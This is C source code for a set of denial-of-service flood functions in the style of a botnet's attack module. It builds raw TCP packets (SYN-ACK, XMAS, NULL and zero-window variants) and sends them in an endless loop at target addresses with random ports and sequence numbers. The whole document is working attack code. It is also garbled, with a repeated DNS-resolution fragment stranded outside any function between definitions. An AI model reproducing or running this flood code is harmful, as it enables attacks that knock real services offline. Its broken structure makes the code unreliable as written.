void attack_tcpconn_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                          int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->syn = TRUE;
    tcph->ack = TRUE;  /* Full handshake simulation */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_xmas_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->fin = TRUE;
    tcph->syn = TRUE;
    tcph->rst = TRUE;
    tcph->psh = TRUE;
    tcph->ack = TRUE;
    tcph->urg = TRUE;  /* XMAS - all flags set */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_null_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                       int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    /* NULL - no flags set */
    tcph->doff = 5;
    tcph->window = rand_next();

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}

    /* Resolve domain via DNS if provided */
    char *domain = attack_get_opt_str(targs_len, opts, opts_len, ATK_OPT_DOMAIN);
    if (domain && util_strlen(domain) > 0) {
        struct resolv_entries *entries = resolv_lookup(domain);
        if (entries && entries->count > 0) {
            targs[0].addr.s_addr = entries->addrs[0];
            targs_len = 1;
        }
        resolv_entries_free(entries);
    }

void attack_window_flood(ipv4_t addr, uint8_t targs_netmask, struct attack_target *targs,
                         int targs_len, struct attack_option *opts, int opts_len) {
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd == -1) return;

    uint16_t dport = attack_get_opt_int(targs_len, opts, opts_len, ATK_OPT_DPORT);
    if (dport == 0) dport = 80;

    char tcp_packet[1500];
    struct iphdr *iph = (struct iphdr *)tcp_packet;
    struct tcphdr *tcph = (struct tcphdr *)(tcp_packet + sizeof(struct iphdr));

    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    tcph->dest = htons(dport);
    tcph->ack = TRUE;
    tcph->doff = 5;
    tcph->window = 0;  /* Zero window - causes issues */

    struct sockaddr_in sin = {0};
    sin.sin_family = AF_INET;

    for (int i = 0; i < targs_len; i++) {
        sin.sin_addr.s_addr = targs[i].addr.s_addr;
        iph->saddr = LOCAL_ADDR;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

        while (attack_ongoing[0]) {
            tcph->source = rand_next();
            tcph->seq = rand_next();
            tcph->ack_seq = rand_next();
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
            sendto(fd, tcp_packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                  (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(fd);
}
